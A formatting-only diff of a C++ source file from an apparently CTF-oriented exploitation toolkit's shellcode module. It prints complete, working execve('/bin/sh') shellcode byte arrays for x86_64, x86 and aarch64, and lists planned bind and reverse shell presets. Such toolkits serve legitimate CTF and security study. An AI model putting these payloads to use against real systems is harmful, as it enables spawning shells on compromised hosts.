@@ -8,14 +8,14 @@
 // trustable subset and grows the matrix in later releases. The gap is
 // logged in docs/DECISIONS.md.
 
-#include "abcpwn/commands/shellcode.hpp"
-
 #include <array>
 #include <cstdint>
 #include <span>
 #include <string>
 #include <string_view>
 #include <vector>
+
+#include "abcpwn/commands/shellcode.hpp"
 
 namespace abcpwn::commands::shellcode {
 
@@ -43,9 +43,8 @@ namespace {
 //
 // Total: 23 bytes, no NULL bytes.
 constexpr std::array<std::uint8_t, 23> kX86_64_Sh = {
-    0x6a, 0x3b, 0x58, 0x99,
-    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
-    0x53, 0x54, 0x5f, 0x52, 0x57, 0x54, 0x5e, 0x0f, 0x05,
+    0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
+    0x73, 0x68, 0x53, 0x54, 0x5f, 0x52, 0x57, 0x54, 0x5e, 0x0f, 0x05,
 };
 
 // ---------------------------------------------------------------------
@@ -65,11 +64,8 @@ constexpr std::array<std::uint8_t, 23> kX86_64_Sh = {
 //
 // Total: 25 bytes, no NULL bytes.
 constexpr std::array<std::uint8_t, 25> kX86_Sh = {
-    0x31, 0xc0, 0x50,
-    0x68, 0x2f, 0x2f, 0x73, 0x68,
-    0x68, 0x2f, 0x62, 0x69, 0x6e,
-    0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1,
-    0x31, 0xd2, 0xb0, 0x0b, 0xcd, 0x80,
+    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e,
+    0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0x31, 0xd2, 0xb0, 0x0b, 0xcd, 0x80,
 };
 
 // ---------------------------------------------------------------------
@@ -95,36 +91,32 @@ constexpr std::array<std::uint8_t, 25> kX86_Sh = {
 // encodings that are out of scope for this milestone; callers who need
 // null-free aarch64 must hand-roll or use --encoder xor.
 constexpr std::array<std::uint8_t, 40> kAarch64_Sh = {
-    0xa8, 0x0b, 0x80, 0xd2,
-    0x4e, 0x5c, 0x84, 0xd2,
-    0xce, 0xd2, 0xac, 0xf2,
-    0xee, 0xe5, 0xc5, 0xf2,
-    0x0e, 0xed, 0xec, 0xf2,
-    0xee, 0x0f, 0x1f, 0xf8,
-    0xe0, 0x03, 0x00, 0x91,
-    0x21, 0x00, 0x01, 0xca,
-    0x42, 0x00, 0x02, 0xca,
-    0x01, 0x00, 0x00, 0xd4,
+    0xa8, 0x0b, 0x80, 0xd2, 0x4e, 0x5c, 0x84, 0xd2, 0xce, 0xd2, 0xac, 0xf2, 0xee, 0xe5,
+    0xc5, 0xf2, 0x0e, 0xed, 0xec, 0xf2, 0xee, 0x0f, 0x1f, 0xf8, 0xe0, 0x03, 0x00, 0x91,
+    0x21, 0x00, 0x01, 0xca, 0x42, 0x00, 0x02, 0xca, 0x01, 0x00, 0x00, 0xd4,
 };
 
 struct DbEntry {
-    arch::Arch                       arch;
-    Preset                           preset;
-    std::span<const std::uint8_t>    bytes;
-    std::string_view                 description;
-    bool                             null_free;
+    arch::Arch arch;
+    Preset preset;
+    std::span<const std::uint8_t> bytes;
+    std::string_view description;
+    bool null_free;
 };
 
 constexpr std::array<DbEntry, 3> kDatabase = {{
-    {arch::Arch::X86_64,  Preset::Sh,
-     std::span<const std::uint8_t>(kX86_64_Sh.data(),  kX86_64_Sh.size()),
+    {arch::Arch::X86_64,
+     Preset::Sh,
+     std::span<const std::uint8_t>(kX86_64_Sh.data(), kX86_64_Sh.size()),
      "execve(\"/bin//sh\", NULL, NULL) via syscall (23 bytes, null-free)",
      true},
-    {arch::Arch::X86,     Preset::Sh,
-     std::span<const std::uint8_t>(kX86_Sh.data(),     kX86_Sh.size()),
+    {arch::Arch::X86,
+     Preset::Sh,
+     std::span<const std::uint8_t>(kX86_Sh.data(), kX86_Sh.size()),
      "execve(\"/bin//sh\", NULL, NULL) via int 0x80 (25 bytes, null-free)",
      true},
-    {arch::Arch::Aarch64, Preset::Sh,
+    {arch::Arch::Aarch64,
+     Preset::Sh,
      std::span<const std::uint8_t>(kAarch64_Sh.data(), kAarch64_Sh.size()),
      "execve(\"/bin/sh\", NULL, NULL) via svc #0 (40 bytes; aarch64 fixed-"
      "width encodings make a fully null-free payload impractical)",
@@ -140,11 +132,11 @@ const std::vector<ShellcodePayload>& materialized_db() {
         out.reserve(kDatabase.size());
         for (const auto& e : kDatabase) {
             ShellcodePayload p;
-            p.arch        = e.arch;
-            p.preset      = e.preset;
+            p.arch = e.arch;
+            p.preset = e.preset;
             p.bytes.assign(e.bytes.begin(), e.bytes.end());
             p.description = e.description;
-            p.null_free   = e.null_free;
+            p.null_free = e.null_free;
             out.push_back(std::move(p));
         }
         return out;
@@ -152,24 +144,34 @@ const std::vector<ShellcodePayload>& materialized_db() {
     return db;
 }
 
-}  // namespace
+} // namespace
 
 std::optional<Preset> preset_from_string(std::string_view s) noexcept {
-    if (s == "sh")        return Preset::Sh;
-    if (s == "read-flag") return Preset::ReadFlag;
-    if (s == "cat-flag")  return Preset::CatFlag;
-    if (s == "bind")      return Preset::Bind;
-    if (s == "reverse")   return Preset::Reverse;
+    if (s == "sh")
+        return Preset::Sh;
+    if (s == "read-flag")
+        return Preset::ReadFlag;
+    if (s == "cat-flag")
+        return Preset::CatFlag;
+    if (s == "bind")
+        return Preset::Bind;
+    if (s == "reverse")
+        return Preset::Reverse;
     return std::nullopt;
 }
 
 std::string_view preset_name(Preset p) noexcept {
     switch (p) {
-        case Preset::Sh:        return "sh";
-        case Preset::ReadFlag:  return "read-flag";
-        case Preset::CatFlag:   return "cat-flag";
-        case Preset::Bind:      return "bind";
-        case Preset::Reverse:   return "reverse";
+    case Preset::Sh:
+        return "sh";
+    case Preset::ReadFlag:
+        return "read-flag";
+    case Preset::CatFlag:
+        return "cat-flag";
+    case Preset::Bind:
+        return "bind";
+    case Preset::Reverse:
+        return "reverse";
     }
     return "unknown";
 }
@@ -181,12 +183,11 @@ core::Result<ShellcodePayload> lookup(const PayloadSpec& spec) {
         }
     }
     return core::err(core::ErrorCode::Unsupported,
-        std::string("shellcode: no built-in payload for preset ")
-            + std::string(preset_name(spec.preset))
-            + " on arch "
-            + std::string(arch::arch_name(spec.arch))
-            + " (v0.1 ships a curated subset; bind/reverse/read-flag "
-              "and additional arches land in subsequent releases)");
+                     std::string("shellcode: no built-in payload for preset ")
+                         + std::string(preset_name(spec.preset)) + " on arch "
+                         + std::string(arch::arch_name(spec.arch))
+                         + " (v0.1 ships a curated subset; bind/reverse/read-flag "
+                           "and additional arches land in subsequent releases)");
 }
 
 std::span<const ShellcodePayload> database() noexcept {
@@ -194,4 +195,4 @@ std::span<const ShellcodePayload> database() noexcept {
     return std::span<const ShellcodePayload>(db.data(), db.size());
 }
 
-}  // namespace abcpwn::commands::shellcode
+} // namespace abcpwn::commands::shellcode
